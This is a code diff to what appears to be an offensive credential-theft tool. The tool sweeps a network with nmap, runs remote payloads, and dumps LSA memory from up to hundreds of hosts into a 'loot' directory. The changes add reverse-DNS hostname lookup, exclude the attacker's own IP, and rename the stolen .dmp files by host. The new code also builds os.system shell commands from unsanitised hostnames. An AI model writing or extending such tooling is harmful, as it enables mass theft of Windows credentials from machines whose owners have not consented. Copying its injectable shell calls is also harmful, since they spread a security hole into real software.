@@ -550,7 +550,7 @@ def load_smbclient_auth_file(path):
 
 ############################################################################### END OF WMIEXEC#####################################################
 
-def do_ip(inpu): # check if the inputted ips are up so we dont scan thigns we dont need to
+def do_ip(inpu, local_ip): # check if the inputted ips are up so we dont scan thigns we dont need to
     print('\n[scanning hosts]')
     scanner = nmap.PortScanner()
     if os.path.isfile(inpu):  # if its in a file the arguments are different
@@ -558,9 +558,22 @@ def do_ip(inpu): # check if the inputted ips are up so we dont scan thigns we do
     else:
         scanner.scan(hosts=inpu, arguments='-n -sn')
     uphosts = scanner.all_hosts()
+
+    try:
+        uphosts.remove(local_ip)  # no point in attacking ourselves
+    except:
+        pass
+
+    hostnames = []
+    for ip in uphosts:
+        try:
+            hostnames.append(socket.gethostbyaddr(ip)[0])
+        except:
+            pass
+
     print('[scan complete]')
 
-    return uphosts
+    return uphosts, hostnames
 
 def gen_payload(share_name, payload_name, drive_letter):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -1082,11 +1095,7 @@ if __name__ == '__main__':
                 print("local IP => " + local_ip)
 
         if '-oe' not in sys.argv: # why scan if we not gonna do anything
-            addresses = do_ip(address) # gets a list of up hosts
-            try:
-                addresses.remove(local_ip) # no point in attacking ourselves
-            except:
-                pass
+            addresses, hostnames = do_ip(address, local_ip) # gets a list of up hosts
 
             if len(addresses) > 500: # ensure that they dont waste over 25 gb of storage
                 print("\nWARNING You are about to try and steal LSA from up to {} IPs...\nThis is roughly {}GB in size are you sure you want to do this? ".format(str(len(addresses)), str((len(addresses)*52)/1024)))
@@ -1145,6 +1154,11 @@ if __name__ == '__main__':
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
+
+        dmp_files = [f for f in os.listdir("{}/loot/{}/".format(cwd, timestamp)) if f.endswith('.dmp')] # this should enable us to change the filenames to hostname_ip.dmp
+        for file in dmp_files:
+            if file[:file.find(".")] in hostnames:
+                os.system("mv {}/loot/{}/{} {}/loot/{}/{}.dmp".format(cwd, timestamp, file, cwd, timestamp, (file[:file.find(".")] + "_" + addresses[hostnames.index(file[:file.find(".")])])))
 
         if options.ap != False:
             print("\n[parsing files]")
